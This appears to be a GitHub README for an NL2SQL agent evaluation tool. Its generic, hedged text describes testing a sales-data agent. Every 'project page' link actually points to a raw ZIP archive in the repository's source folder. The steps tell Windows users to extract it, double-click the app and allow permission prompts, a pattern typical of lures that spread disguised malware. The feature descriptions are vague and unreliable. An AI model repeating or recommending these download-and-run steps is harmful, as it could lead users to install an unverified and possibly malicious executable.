# 🔎 nl2sql-agent-evaluator - Check SQL Answers with Confidence

[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip)

## 🧭 What this app does

nl2sql-agent-evaluator helps you test how well a Sales Data Agent answers natural language questions with SQL. It can build ground truth data, compare answers, and score results with AI.

Use it to check if your agent gives the right answer for sales, revenue, customer, and pipeline questions.

## 💻 What you need

- A Windows PC
- Internet access
- A modern web browser
- Permission to download files
- Enough disk space for the app and its data files

If the app uses Python in the background, the package usually includes everything needed to run it on Windows.

## 🚀 Download and install

Visit the project page here:

https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip

On that page, look for:

- the latest release
- a setup file
- a Windows app file
- a ZIP file with the app inside

If you see a ZIP file:

1. Download the ZIP file
2. Right-click it and choose Extract All
3. Open the extracted folder
4. Double-click the app file or start file

If you see an installer:

1. Download the installer
2. Open the file
3. Follow the on-screen steps
4. Finish the setup
5. Open the app from your Start menu or desktop

If Windows asks for permission, choose Allow or Yes

## 🛠️ First-time setup

When you open the app for the first time, it may ask you to set a few things up:

1. Choose your data source
2. Connect to your SQL or warehouse system
3. Pick a test set or upload one
4. Select the model you want to use for evaluation
5. Start the run

For Microsoft data stacks, the app can work with tools such as:

- Azure Data
- Microsoft Fabric
- SQL-based warehouse data
- Sales reporting tables

## 📊 What you can test

This app fits common NL2SQL review tasks such as:

- answer accuracy
- SQL correctness
- grounded answers
- table and column choice
- query result match
- judge model scoring

It helps teams compare an agent’s reply against a known correct answer. That makes it easier to spot bad SQL, weak prompt design, and wrong data lookups.

## 🧪 Typical workflow

1. Enter a business question in plain English
2. Generate the SQL or answer from your agent
3. Build or load the ground truth answer
4. Compare the agent output with the expected result
5. Review the score and any mismatch
6. Fix the agent or prompt and run the test again

Example questions:

- What were total sales last quarter?
- Which region had the highest revenue?
- How many new customers joined this month?
- What is the average order value by segment?

## 📁 Project layout

You may see files and folders for:

- app startup files
- evaluation scripts
- sample test data
- prompt templates
- SQL or answer checks
- model settings
- result logs

If the app includes a sample dataset, use it first. That gives you a quick way to learn how the tool works before you test live data.

## 🔍 How evaluation works

The app compares the agent answer with the expected answer. It may check:

- exact text match
- SQL structure
- numeric result match
- semantic meaning
- judge model opinion

This is useful when the same answer can use different words but still mean the same thing. It helps teams avoid false failures and catch real mistakes.

## 🧰 Common uses

- test an NL2SQL agent before release
- review answer quality after prompt changes
- build a repeatable QA flow
- measure progress over time
- compare different models or prompt versions

## ⚙️ Troubleshooting

If the app does not open:

- make sure the file finished downloading
- try extracting the ZIP again
- check that Windows did not block the file
- run the app from the extracted folder
- restart your PC and try again

If the app opens but cannot connect to data:

- check your connection settings
- confirm the server name, database name, and login details
- make sure the data source is online
- verify that your account can read the tables

If results look wrong:

- review the question text
- check the expected answer
- make sure the right table names are used
- confirm that the judge model is set up the way you want

## 🧾 Good practices

- start with a small test set
- use clear business questions
- keep one ground truth file for each test run
- save results before changing prompts
- compare runs over time
- check both SQL and final answer text

## 📌 Who this is for

This app is useful for:

- business users who want reliable sales answers
- analysts who work with SQL
- data teams that build AI agents
- QA teams that test AI outputs
- anyone checking NL2SQL accuracy in a sales setting

## 📎 Download

Open the project page and download or install from there:

https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip